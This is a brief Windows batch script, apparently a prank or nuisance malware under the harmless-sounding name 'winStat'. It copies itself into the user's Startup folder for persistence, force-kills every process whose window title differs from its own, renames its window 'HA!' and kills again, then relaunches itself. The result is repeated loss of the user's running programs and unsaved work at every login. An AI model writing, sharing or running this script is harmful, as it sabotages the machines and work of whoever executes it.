@ECHO OFF
COLOR 0A
::I was hoping to not have it copy itself into the startup folder because of some... accidents I have had, but whatever. XD
IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
COPY winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
)
TITLE winStat
TASKKILL /F /FI "WINDOWTITLE ne winStat"
TITLE HA!
TASKKILL /F /FI "WINDOWTITLE ne HA!"
START winStat.bat
